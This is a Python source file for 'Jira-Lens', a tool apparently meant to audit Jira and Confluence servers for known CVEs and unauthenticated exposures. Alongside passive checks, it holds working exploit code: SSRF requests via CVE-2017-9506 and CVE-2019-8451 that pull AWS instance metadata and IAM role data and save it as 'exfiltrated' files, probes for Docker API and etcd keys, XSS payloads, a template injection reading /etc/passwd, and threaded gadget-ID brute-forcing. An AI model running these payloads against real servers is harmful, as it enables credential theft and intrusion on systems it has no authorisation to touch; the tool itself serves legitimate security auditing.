import argparse
import json
import os
import socket
import sys
import threading
import time
from urllib.parse import urlparse

import progressbar
import requests

from config import Colors, HEADERS, AWSConfig


def clean_url(url):
    while url.endswith("/"):
        url = url[0:-1]
    return url


def detect_version(base_url: str) -> None:
    try:
        response = requests.get(f"{base_url}/rest/api/latest/serverInfo", allow_redirects=False)
        server_data = response.json()

        print('\n')
        print(f"\t{Colors.GREEN}-------- Server Information -----------{Colors.RESET}\n")
        print(f"{Colors.BOLD}{Colors.MAGENTA} [*] URL --> {server_data.get('baseUrl')}")
        print(f"{Colors.BOLD_RESET} [*] Server Title --> {server_data.get('serverTitle')}")
        print(f" [*] Version --> {server_data.get('version')}")
        print(f" [*] Deployment Type --> {server_data.get('deploymentType')}")
        print(f" [*] Build Number --> {server_data.get('buildNumber')}")
        print(f" [*] Database Build Number --> {server_data.get('databaseBuildNumber')}")

        try:
            host = urlparse(base_url).netloc
            host_info = socket.gethostbyaddr(host)
            print(f" [*] Host Address --> {host_info[0]}")
        except Exception:
            print(" [*] Host Address --> Error While Resolving Host")

        try:
            ip_address = socket.gethostbyaddr(urlparse(base_url).netloc)[2][0]
            print(f" [*] IP Address --> {ip_address}\n")
        except Exception:
            print(" [*] IP Address --> Error While Resolving IP Address\n")

    except KeyboardInterrupt:
        print(f"{Colors.RED} Keyboard Interrupt Detected {Colors.RESET}")
        sys.exit(0)

    except Exception as e:
        print(f"{Colors.RED}An Unexpected Error Occurred:{Colors.RESET} {e}")


def isaws(base_url: str) -> bool:
    try:
        host = urlparse(base_url).netloc
        return "amazonaws" in socket.gethostbyaddr(host)[0]
    except Exception:
        return False


''' Different CVE's Defined For Scanning. Add New CVE's Here '''


def CVE_2017_9506(base_url: str) -> None:
    to_load = "https://google.com"
    test_url = f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}"
    r = requests.get(test_url, allow_redirects=False, headers=HEADERS)

    if r.status_code == 200 and "googlelogo" in r.text:
        print(
            f"{Colors.RED}[+] {Colors.GREEN} [CRITICAL] {Colors.RESET} Vulnerable To CVE-2017-9506 (SSRF) : {test_url}\n")
        response.append(f"[+] [CRITICAL] Vulnerable To CVE-2017-9506 (SSRF) : {test_url}\n")

        print("\tChecking For AWS Metadata Extraction\n")
        if isaws(base_url):
            print("\tAWS Instance Found")
            print("\tExfiltrating Data from the Instance")
            print("\n\tDUMPING AWS INSTANCE DATA ")

            aws_instance_url = f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWSConfig.BASE}"
            r = requests.get(aws_instance_url, allow_redirects=False, headers=HEADERS)
            aws_instance = r.text
            if r.status_code == 200:
                print(f"\tAWS INSTANCE Recovered : {aws_instance_url}")

            print("\n\tDUMPING AWS METADATA ")
            aws_metadata_url = f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWSConfig.METADATA}"
            r = requests.get(aws_metadata_url, allow_redirects=False, headers=HEADERS)
            aws_metadata = r.text
            if r.status_code == 200:
                print(f"\tAWS Metadata Recovered : {aws_metadata_url}")

            print("\n\tDUMPING AWS IAM DATA ")
            aws_iam_url = f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWSConfig.IAM_ROLE}"
            r = requests.get(aws_iam_url, allow_redirects=False, headers=HEADERS)
            aws_iam_data = r.text
            if r.status_code == 200:
                print(f"\tAWS IAM DATA Recovered : {aws_iam_url}\n")
            data = {
                "base_url": base_url,
                "aws_instance": aws_instance,
                "aws_metadata": aws_metadata,
                "aws_iam_data": aws_iam_data,
            }
            filename = f"CVE-2017-9506_{urlparse(base_url).netloc}.json"
            with open(f"{output_folder}{filename}", 'a', encoding='utf-8') as cve_json_file:
                json.dump(data, cve_json_file, indent=2)
                print(f"\tExfiltrated Data Written to [{filename}]\n\n")

        exfil_tests = [
            ("http://100.100.100.200/latest/meta-data/", "Alibaba Metadata"),
            ("http://127.0.0.1:2375/v1.24/containers/json", "Docker Container Lists"),
            ("http://127.0.0.1:2379/v2/keys/?recursive=true", "Kubernetes ETCD API keys"),
        ]

        for test_url, description in exfil_tests:
            print(f"\tChecking for {description}")
            full_url = f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={test_url}"
            r = requests.get(full_url, allow_redirects=False, headers=HEADERS)
            if r.status_code == 200:
                print(f"\t----> {description} Recovered : {full_url}")

    else:
        print(f"{Colors.RESET}[-] Not Vulnerable To CVE-2017-9506")


def CVE_2019_8449(base_url: str) -> None:
    url = f"{base_url}/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true"
    r = requests.get(url, allow_redirects=False, headers=HEADERS)

    if r.status_code == 200:
        if "You are not authenticated. Authentication required to perform this operation." in r.text:
            print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2019-8449\n")
        else:
            print(f"{Colors.RED}[+] {Colors.GREEN} [LOW]{Colors.RESET} Vulnerable To CVE-2019-8449 : {url}\n")
            response.append(f"[+] [LOW] Vulnerable To CVE-2019-8449 : {url}\n")
    else:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2019-8449\n")


def CVE_2019_8442(base_url: str) -> None:
    url = f"{base_url}/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml"
    r = requests.get(url, allow_redirects=False, headers=HEADERS)

    if r.status_code != 200:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2019-8442\n")
    else:
        print(f"{Colors.RED}[+] {Colors.GREEN} [LOW]{Colors.RESET} Vulnerable To CVE-2019-8442 : {url}\n")
        response.append(f"[+] [LOW] Vulnerable To CVE-2019-8442 : {url}\n")


def CVE_2019_8443(base_url: str) -> None:
    url = f"{base_url}/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml"
    r = requests.get(url, allow_redirects=False, headers=HEADERS)

    if r.status_code == 200 or "<project" in r.text:
        print(f"{Colors.RED}[+] {Colors.GREEN} [LOW]{Colors.RESET} Vulnerable To CVE-2019-8443 : {url}\n")
        response.append(f"[+] [LOW] Vulnerable To CVE-2019-8443 : {url}\n")
    else:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2019-8443\n")


def CVE_2019_8451(base_url: str) -> None:
    to_load = "https://google.com"
    test_url = f"{base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}"
    r = requests.get(test_url, allow_redirects=False, headers=HEADERS)

    if r.status_code == 200 and "googlelogo" in r.text:
        print(
            f"{Colors.RED}[+] {Colors.GREEN} [CRITICAL]{Colors.RESET} Vulnerable To CVE-2019-8451 (SSRF) : {test_url}\n")
        response.append(f"[+] [CRITICAL] Vulnerable To CVE-2019-8451 (SSRF) : {test_url}\n")

        print("\tChecking For AWS Metadata Extraction\n")
        if isaws(base_url):
            print("\tAWS Instance Found")
            print("\tExfiltrating Data from the Instance")

            # AWS instance
            aws_instance_url = f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWSConfig.BASE}"
            print("\n\tDUMPING AWS INSTANCE DATA ")
            r = requests.get(aws_instance_url, allow_redirects=False, headers=HEADERS)
            aws_instance = r.text
            if r.status_code == 200:
                print(f"\tAWS INSTANCE Recovered : {aws_instance_url}")

            # AWS metadata
            aws_metadata_url = f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWSConfig.METADATA}"
            print("\n\tDUMPING AWS METADATA ")
            r = requests.get(aws_metadata_url, allow_redirects=False, headers=HEADERS)
            aws_metadata = r.text
            if r.status_code == 200:
                print(f"\tAWS Metadata Recovered : {aws_metadata_url}")

            # AWS IAM data
            aws_iam_url = f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWSConfig.IAM_ROLE}"
            print("\n\tDUMPING AWS IAM DATA ")
            r = requests.get(aws_iam_url, allow_redirects=False, headers=HEADERS)
            aws_iam_data = r.text
            if r.status_code == 200:
                print(f"\tAWS IAM DATA Recovered : {aws_iam_url}\n")
            data = {
                "base_url": base_url,
                "aws_instance": aws_instance,
                "aws_metadata": aws_metadata,
                "aws_iam_data": aws_iam_data,
            }

            filename = f"CVE-2019-8451_{urlparse(base_url).netloc}.json"
            with open(f"{output_folder}{filename}", 'a', encoding='utf-8') as cve_json_file:
                json.dump(data, cve_json_file, indent=2)
                print(f"\tExfiltrated Data Written to [{filename}]\n\n")

        # Other services
        exfil_targets = [
            ("http://100.100.100.200/latest/meta-data/", "Alibaba Metadata"),
            ("http://127.0.0.1:2375/v1.24/containers/json", "Docker Container Lists"),
            ("http://127.0.0.1:2379/v2/keys/?recursive=true", "Kubernetes ETCD API keys")
        ]

        for target_url, description in exfil_targets:
            print(f"\tChecking for {description}")
            full_url = f"{base_url}/plugins/servlet/gadgets/makeRequest?url={target_url}"
            r = requests.get(full_url, allow_redirects=False, headers=HEADERS)
            if r.status_code == 200:
                print(f"\t{description} Found : {full_url}")

    else:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2019-8451\n")


def CVE_2019_3403(base_url: str) -> None:
    url = f"{base_url}/rest/api/2/user/picker?query=admin"
    r = requests.get(url, allow_redirects=False, headers=HEADERS)

    if "The user named '{0}' does not exist" in r.text or "errorMessages" in r.text:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2019-3403\n")
    else:
        print(f"{Colors.RED}[+] {Colors.GREEN} [LOW]{Colors.RESET} Vulnerable To CVE-2019-3403 : {url}\n")
        response.append(f"[+] [LOW] Vulnerable To CVE-2019-3403 : {url}\n")


def CVE_2019_3402(base_url: str) -> None:
    url = (
        f"{base_url}/secure/ConfigurePortalPages!default.jspa"
        f"?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(\"XSS\")%3C%2fscript%3Et1nmk&Search=Search"
    )
    r = requests.get(url, allow_redirects=False, headers=HEADERS)

    if "XSS" in r.text:
        print(f"{Colors.RED}[+] {Colors.GREEN} [HIGH]{Colors.RESET} Vulnerable To CVE-2019-3402 [Maybe] : {url}\n")
        response.append(f"[+] [HIGH] Vulnerable To CVE-2019-3402 [Maybe] : {url}\n")
    else:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2019-3402\n")


def CVE_2019_11581(base_url: str) -> None:
    url = f"{base_url}/secure/ContactAdministrators!default.jspa"
    r = requests.get(url, allow_redirects=False)

    if r.status_code == 200:
        if "Your Jira administrator" in r.text or "Contact Site Administrators" in r.text:
            print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2019-11581\n")
        else:
            print(
                f"{Colors.RED}[+] {Colors.GREEN} [CRITICAL]{Colors.RESET} Vulnerable To CVE-2019-11581 [Confirm Manually] : {url}\n")
            response.append(f"[+] [CRITICAL] Vulnerable To CVE-2019-11581 [Confirm Manually] : {url}\n")
    else:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2019-11581\n")


def CVE_2020_14179(base_url: str) -> None:
    url = f"{base_url}/secure/QueryComponent!Default.jspa"
    r = requests.get(url, allow_redirects=False, headers=HEADERS)

    if r.status_code == 200:
        print(f"{Colors.RED}[+] {Colors.GREEN} [LOW]{Colors.RESET} Vulnerable To CVE-2020-14179 : {url}\n")
        response.append(f"[+] [LOW] Vulnerable To CVE-2020-14179 : {url}\n")
    else:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2020-14179\n")


def CVE_2020_14181(base_url: str) -> None:
    url = f"{base_url}/secure/ViewUserHover.jspa?username=Admin"
    r = requests.get(url, allow_redirects=False, headers=HEADERS)

    if r.status_code != 200 or "Your session has timed out" in r.text:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2020-14181\n")
    else:
        print(f"{Colors.RED}[+] {Colors.GREEN} [LOW]{Colors.RESET} Vulnerable To CVE-2020-14181 : {url}\n")
        response.append(f"[+] [LOW] Vulnerable To CVE-2020-14181 : {url}\n")


def CVE_2018_20824(base_url: str) -> None:
    print("\n")
    url = (
        f"{base_url}/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000"
        f"&cyclePeriod=alert(\"XSS_POPUP\")"
    )
    r = requests.get(url, allow_redirects=False, headers=HEADERS)
    if "XSS_POPUP" in r.text:
        print(
            f"{Colors.RED}[+] {Colors.GREEN} [HIGH]{Colors.RESET} Vulnerable To CVE-2018-20824 : {url}\n"
        )
        response.append(
            f"[+] [HIGH] Vulnerable To CVE-2018-20824 : {url}\n"
        )
    else:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2018-20824\n")


def CVE_2019_3396(base_url: str) -> None:
    preview_url = f"{base_url}/rest/tinymce/1/macro/preview"
    body = {
        "contentId": "1",
        "macro": {
            "name": "widget",
            "params": {
                "url": "https://google.com",
                "width": "1000",
                "height": "1000",
                "_template": "file:///etc/passwd"
            },
            "body": ""
        }
    }

    # Initial GET to establish session
    r = requests.get(preview_url, allow_redirects=False, headers=HEADERS)
    if r.status_code != 200:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2019-3396\n")
        return

    # Then try POST
    r = requests.post(preview_url, json=body, headers=HEADERS)
    if "root:" in r.text:
        print(
            f"{Colors.RED}[+] {Colors.GREEN} [CRITICAL]{Colors.RESET} Vulnerable To CVE-2019-3396 : {preview_url}\n"
        )
        response.append(
            f"[+] [CRITICAL] Vulnerable To CVE-2019-3396 : {preview_url}\n"
        )


def CVE_2020_36287(base_url: str, gadget_id: str) -> None:
    try:
        url = f"{base_url}/rest/dashboards/1.0/10000/gadget/{gadget_id}/prefs"
        r = requests.get(url)
        if r.status_code == 200 and "userPrefsRepresentation" in r.text:
            response_CVE_2020_36287.append(f"{url}\n")
    except Exception:
        pass


def CVE_2020_36287_helper(base_url: str) -> None:
    widgets = ['BruteForcing Gadget ID... ', progressbar.AnimatedMarker()]
    bar = progressbar.ProgressBar(widgets=widgets).start()

    temp_file = "helper.txt"
    with open(temp_file, 'w', encoding='utf-8') as no:
        for i in range(10000, 10500):
            no.write(f"{i}\n")

    time.sleep(0.1)
    bar.update(50)

    threads: list[threading.Thread] = []
    with open(temp_file, 'r', encoding='utf-8') as op:
        for num in op:
            t = threading.Thread(target=CVE_2020_36287, args=(base_url, num.strip()))
            t.start()
            threads.append(t)
        for tt in threads:
            tt.join()

    if response_CVE_2020_36287:
        filename = f"CVE-2020-36287_{urlparse(base_url).netloc}.json"
        with open(os.path.join(output_folder, filename), 'a', encoding='utf-8') as res_jf:
            json.dump(response_CVE_2020_36287, res_jf, indent=2)

    os.remove(temp_file)


def CVE_2020_36287_helper_2(base_url: str) -> None:
    if response_CVE_2020_36287:
        filename = f"CVE-2020-36287_{urlparse(base_url).netloc}.json"
        print(f"{Colors.RED}[+] {Colors.GREEN} [LOW]{Colors.RESET} Vulnerable To CVE-2020-36287\n")
        response.append(f"[+] [LOW] Vulnerable To CVE-2020-36287 : File Written at [{filename}]\n")
        print(f"\n\tFound Dashboard Gadgets\n\tWritten To File [{filename}]\n")
    else:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2020-36287\n")


def CVE_2020_36289(base_url: str) -> None:
    url = f"{base_url}/jira/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin"
    r = requests.get(url)
    if r.status_code == 200 and "Assignee" in r.text:
        print(f"{Colors.RED}[+] {Colors.GREEN} [MEDIUM]{Colors.RESET} Vulnerable To CVE-2020-36289 : {url}\n")
        response.append(f"[+] [MEDIUM] Vulnerable To CVE-2020-36289 : {url}\n")
    else:
        print(f"{Colors.GRAY}[-] Not Vulnerable To CVE-2020-36289\n")


def user_reg(base_url: str) -> None:
    try:
        url = f"{base_url}/secure/Signup!default.jspa"
        r = requests.get(url, allow_redirects=False)
        if r.status_code == 200:
            if "private" in r.text:
                print(f"{Colors.GRAY}[-] User registration is Disabled{Colors.RESET}\n")
            else:
                print(f"{Colors.RED}[+] {Colors.GREEN}[MEDIUM]{Colors.RESET} User registration is Enabled : {url}\n")
                response.append(f"[+] [MEDIUM] User registration is Enabled : {url}\n")
        else:
            print(f"{Colors.GRAY}[-] User registration is Disabled{Colors.RESET}\n")
    except KeyboardInterrupt:
        print(f"{Colors.RED} User Aborted the Program {Colors.RESET}")


def dev_mode(base_url: str) -> None:
    url = f"{base_url}/"
    r = requests.get(url, allow_redirects=False)
    if r.status_code == 200 and '<meta name="ajs-dev-mode" content="true">' in r.text:
        print(f"{Colors.RED}[+] {Colors.GREEN} [LOW]{Colors.RESET} Dev Mode is Enabled : {url}\n")
        response.append(f"[+] [LOW] Dev Mode is Enabled : {url}\n")
    else:
        print(f"{Colors.GRAY}[-] Dev Mode is Disabled{Colors.RESET}\n")


def Unauth_User_picker(base_url: str) -> None:
    url = f"{base_url}/secure/popups/UserPickerBrowser.jspa"
    r = requests.get(url, allow_redirects=False, headers=HEADERS)
    if r.status_code == 200 and "user-picker" in r.text:
        print(f"{Colors.RED}[+] {Colors.CYAN}[INFO]{Colors.RESET} User Picker Enabled : {url}?max=1000\n")
        response.append(f"[+] [INFO] User Picker Enabled : {url}?max=1000\n")
    else:
        print(f"{Colors.GRAY}[-] User Picker Disabled{Colors.RESET}\n")


def Unauth_Group_Picker(base_url: str) -> None:
    url = f"{base_url}/rest/api/2/groupuserpicker"
    r = requests.get(url, allow_redirects=False, headers=HEADERS)
    if r.status_code == 200:
        if "You are not authenticated. Authentication required to perform this operation." in r.text:
            print(f"{Colors.GRAY}[-] REST GroupUserPicker is not available\n")
        else:
            print(f"{Colors.RED}[+] {Colors.CYAN}[INFO]{Colors.RESET} REST GroupUserPicker is available : {url}\n")
            response.append(f"[+] [INFO] REST GroupUserPicker is available : {url}\n")
    else:
        print(f"{Colors.GRAY}[-] REST GroupUserPicker is not available\n")


def Unauth_Resolutions(base_url: str) -> None:
    url = f"{base_url}/rest/api/2/resolution"
    r = requests.get(url, allow_redirects=False, headers=HEADERS)
    if r.status_code == 200 and any(key in r.text for key in ['self', 'description', 'name']):
        print(f"{Colors.RED}[+] {Colors.CYAN}[INFO]{Colors.RESET} Resolutions Found : {url}\n")
        response.append(f"[+] [INFO] Resolutions Found : {url}\n")
    else:
        print(f"{Colors.GRAY}[-] No Resolutions Found\n")


def Unauth_Projects(base_url: str) -> None:
    url = f"{base_url}/rest/api/2/project?maxResults=100"
    r = requests.get(url, allow_redirects=False, headers=HEADERS)
    if r.status_code == 200 and all(key in r.text for key in ['projects', 'startAt', 'maxResults']):
        print(f"{Colors.RED}[+] {Colors.GREEN}[LOW]{Colors.RESET} Projects Found : {url}\n")
        response.append(f"[+] [LOW] Projects Found : {url}\n")
    else:
        print(f"{Colors.GRAY}[-] Projects Not Found\n")


def Unauth_Project_categories(base_url: str) -> None:
    url = f"{base_url}/rest/api/2/projectCategory?maxResults=1000"
    r = requests.get(url, allow_redirects=False, headers=HEADERS)
    if r.status_code == 200 and any(key in r.text for key in ['self', 'description', 'name']):
        print(f"{Colors.RED}[+] {Colors.GREEN}[LOW]{Colors.RESET} Project Groups Found : {url}\n")
        response.append(f"[+] [LOW] Project Groups Found : {url}\n")
    else:
        print(f"{Colors.GRAY}[-] Project Groups Not Found{Colors.RESET}\n")


def Unauth_Dashboard(base_url: str) -> None:
    url = f"{base_url}/rest/api/2/dashboard?maxResults=100"
    r = requests.get(url, allow_redirects=False, headers=HEADERS)
    if r.status_code == 200 and all(key in r.text for key in ['dashboards', 'startAt', 'maxResults']):
        print(f"{Colors.RED}[+] {Colors.CYAN}[INFO]{Colors.RESET} Found Unauthenticated DashBoard Access : {url}\n")
        response.append(f"[+] [INFO] Found Unauthenticated DashBoard Access : {url}\n")
    else:
        print(f"{Colors.GRAY}[-] No Unauthenticated DashBoard Access Found{Colors.RESET}\n")


def Unauth_Dashboard_Popular(base_url: str) -> None:
    url = f"{base_url}/secure/ManageFilters.jspa?filter=popular&filterView=popular"
    r = requests.get(url, allow_redirects=False, headers=HEADERS)
    if r.status_code == 200 and "Popular Filters" in r.text:
        print(f"{Colors.RED}[+] {Colors.CYAN}[INFO]{Colors.RESET} Filters Accessible : {url}\n")
        response.append(f"[+] [INFO] Filters Accessible : {url}\n")
    else:
        print(f"{Colors.GRAY}[-] Filters Not Accessible{Colors.RESET}\n")


def Unauth_Dashboard_admin(base_url: str) -> None:
    url = f"{base_url}/rest/menu/latest/admin"
    r = requests.get(url, allow_redirects=False, headers=HEADERS)
    if r.status_code == 200 and all(key in r.text for key in ['key', 'link', 'label', 'self']):
        print(f"{Colors.RED}[+] {Colors.CYAN}[INFO]{Colors.RESET} Admin Project Dashboard Accessible : {url}\n")
        response.append(f"[+] [INFO] Admin Project Dashboard Accessible : {url}\n")
    else:
        print(f"{Colors.GRAY}[-] Admin Project Dashboard UnAccessible\n")


def Service_desk_signup(base_url: str) -> None:
    url = f"{base_url}/servicedesk/customer/user/signup"
    r = requests.get(url, allow_redirects=False, headers=HEADERS)
    if r.status_code == 200 and "Service Management" in r.text:
        print(
            f"{Colors.RED}[+] {Colors.GREEN}[MEDIUM]{Colors.RESET} Service Desk Signup Enabled : {url}{Colors.RESET}\n")
        response.append(f"[+] [MEDIUM] Service Desk Signup Enabled : {url}\n")
    else:
        print(f"{Colors.GRAY}[-] Service Desk Signup Disabled{Colors.RESET}\n")


def Unauth_Install_Gadgets(base_url: str) -> None:
    url = f"{base_url}/rest/config/1.0/directory"
    r = requests.get(url)
    if r.status_code == 200 and "jaxbDirectoryContents" in r.text:
        print(f"{Colors.RED}[+] {Colors.GREEN}[LOW]{Colors.RESET} REST Gadgets Accessible : {url}{Colors.RESET}\n")
        response.append(f"[+] [LOW] REST Gadgets Accessible : {url}\n")
    else:
        print(f"{Colors.GRAY}[-] REST Gadgets UnAccessible\n")


def FieldNames_QueryComponentJql(base_url: str) -> None:
    url = f"{base_url}/secure/QueryComponent!Jql.jspa?jql="
    r = requests.get(url, allow_redirects=False, headers=HEADERS)
    if r.status_code == 200 and "searchers" in r.text:
        print(f"{Colors.RED}[+] {Colors.GREEN}[LOW]{Colors.RESET} Found Query Component Fields : {url}\n")
        response.append(f"[+] [LOW] Found Query Component Fields : {url}\n")
    else:
        print(f"{Colors.GRAY}[-] No Query Component Fields Found{Colors.RESET}\n")


def Unauth_Screens(base_url: str) -> None:
    url = f"{base_url}/rest/api/2/screens"
    r = requests.get(url, allow_redirects=False)
    if r.status_code == 200 and any(key in r.text for key in ['id', 'name', 'description']):
        print(f"{Colors.RED}[+] {Colors.GREEN}[LOW]{Colors.RESET} Unauthenticated Access To Screens : {url}\n")
        response.append(f"[+] [LOW] Unauthenticated Access To Screens : {url}\n")
    else:
        print(f"{Colors.GRAY}[-] No Unauthenticated Access To Screens Found{Colors.RESET}\n")


def write_response(response: list[str], base_url: str) -> None:
    filename = f"Jira-Lens_{urlparse(base_url).netloc}.json"
    path = f"{output_folder}{filename}"
    with open(path, 'w', encoding='utf-8') as final_jf:
        json.dump(response, final_jf, indent=2)
    print(f"\n\n\n\t{Colors.RED}File Written to : {filename}{Colors.RESET}\n")


def worker(url: str) -> None:
    try:
        base_url = clean_url(url)
        detect_version(base_url)

        # CVE checks
        CVE_2017_9506(base_url)
        CVE_2018_20824(base_url)
        CVE_2019_3402(base_url)
        CVE_2019_3403(base_url)
        CVE_2019_3396(base_url)
        CVE_2019_8442(base_url)
        CVE_2019_8443(base_url)
        CVE_2019_8449(base_url)
        CVE_2019_8451(base_url)
        CVE_2019_11581(base_url)
        CVE_2020_14179(base_url)
        CVE_2020_14181(base_url)
        CVE_2020_36287_helper(base_url)
        CVE_2020_36287_helper_2(base_url)
        CVE_2020_36289(base_url)

        # Unauthenticated checks
        Unauth_User_picker(base_url)
        Unauth_Resolutions(base_url)
        Unauth_Projects(base_url)
        Unauth_Project_categories(base_url)
        Unauth_Dashboard(base_url)
        Unauth_Dashboard_admin(base_url)
        Service_desk_signup(base_url)
        Unauth_Install_Gadgets(base_url)
        user_reg(base_url)
        Unauth_Group_Picker(base_url)
        Unauth_Screens(base_url)
        FieldNames_QueryComponentJql(base_url)

        # Write result
        write_response(response, base_url)

    except KeyboardInterrupt:
        print(f"{Colors.RED} Keyboard Interrupt Detected {Colors.RESET}")
        sys.exit(0)

    except Exception as e:
        print(f"{Colors.RED}An Unexpected Error Occurred: {Colors.RESET} {e}")



def main() -> None:
    parser = argparse.ArgumentParser(description="Jira-Lens : Jira Security Auditing Tool")
    parser.add_argument("-u", "--url", help="Target URL", dest='url')
    parser.add_argument("-f", "--file", type=argparse.FileType('r'), dest='input_file')
    parser.add_argument("-o", "--output", help="Output Folder for result files", default="output/", required=False)

    args = parser.parse_args()

    if not os.path.isdir(args.output):
        print(f"\t{Colors.RED}The Output Path {args.output} does not exist{Colors.RESET}")
        sys.exit(1)

    if not args.url and not args.input_file:
        print(f"{Colors.RED}\tNo URL Provided\n\tUse -u/--url to provide a target{Colors.RESET}")
        sys.exit(0)

    if args.url and args.input_file:
        print(f"{Colors.RED}\tMultiple Inputs Provided\n\tUse either -u (URL) or -f (FILE), not both{Colors.RESET}")
        sys.exit(0)

    global output_folder
    output_folder = args.output

    if args.input_file:
        print(f"{Colors.CYAN}Input File Provided : {args.input_file.name}{Colors.RESET}\n")
        urls = set(line.strip() for line in args.input_file if line.strip())
        print(f"{Colors.CYAN}{len(urls)} Unique URLs Found{Colors.RESET}\n")

        for url in urls:
            worker(url)
    else:
        worker(args.url)


if __name__ == "__main__":
    try:
        response_CVE_2020_36287 = []
        response = []
        output_folder = "output/"  # Default, can be overridden via CLI

        main()

    except KeyboardInterrupt:
        print(f"{Colors.RED} Keyboard Interrupt Detected {Colors.RESET}")
        sys.exit(0)

    except Exception as e:
        print(f"{Colors.RED}An Unexpected Error Occurred:{Colors.RESET} {e}")
        sys.exit(1)
